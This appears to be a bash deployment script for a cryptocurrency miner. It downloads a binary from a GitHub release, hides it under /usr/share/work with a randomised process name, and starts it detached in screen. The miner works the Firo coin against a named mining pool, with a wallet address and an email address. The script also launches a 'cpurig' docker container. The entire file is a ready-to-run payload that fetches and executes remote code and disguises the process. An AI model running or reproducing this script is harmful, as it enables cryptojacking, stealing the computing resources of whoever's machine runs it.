#!/bin/bash
apt-get update
apt-get install -y git wget screen
apt-get install -y docker.io
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
rm -r /usr/share/work/$azure
rm -r /usr/share/work
mkdir /usr/share
mkdir /usr/share/work
wget https://github.com/wollfoo/wolethv100/releases/download/gm/miner
mv miner /usr/share/work/ && chmod u+x miner
cd /usr/share/work/
mv miner $azure -n
cp $azure "$cpuname"
rm -f miner
echo $cpuname" is starting"
screen -d -m ./"${cpuname}" --algo firo --server firo-eu1.picopool.org:22443 --user a9qF6ebLR5pY7LebgwT1YQYjmT1Kmrwx6E.vul/crassanciso1986@gmail.com --ssl 1

docker rm -f cpudataissa
docker run --add-host=localhost:127.215.121.222 -d --name cpudataissa nvts/cpurig
